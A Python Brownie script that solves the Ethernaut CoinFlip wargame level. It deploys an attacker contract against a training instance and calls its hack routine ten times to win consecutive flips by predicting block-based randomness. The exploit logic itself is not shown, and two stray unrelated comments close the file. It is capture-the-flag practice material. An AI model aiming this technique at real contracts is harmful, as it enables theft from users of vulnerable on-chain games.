from scripts.helpful_scripts import get_account
from brownie import accounts, config, interface, Attack

# Level 3 - CoinFlip - instanced generated
ETHERNAUT_INSTANCE = "0x1D45D0e574c470a0F759900D6450975d5C45bA1C"


def main():
    # Ethernaut Instance
    contract = ETHERNAUT_INSTANCE

    # Player account
    # player = accounts.add(config["wallets"]["from_key"])
    player = get_account()

    # To deploy the attacker contract: To interact with the coinflip contract (i.e. Acting as a proxy)
    # Passing in coinflip_contract address for the constructor to initialise the contract.
    attack_coinflip = Attack.deploy(contract, {"from": player})

    print(f"Deployed - attack address is: {attack_coinflip.address}")
    coinflip_interface = interface.Icoinflip(contract)

    for i in range(10):
        attack_coinflip.hack(
            {"from": player, "gas_limit": 10000000, "allow_revert": True}
        )
        print("Consecutive wins: ", coinflip_interface.consecutiveWins())


# 0.002316
# check Incognito market
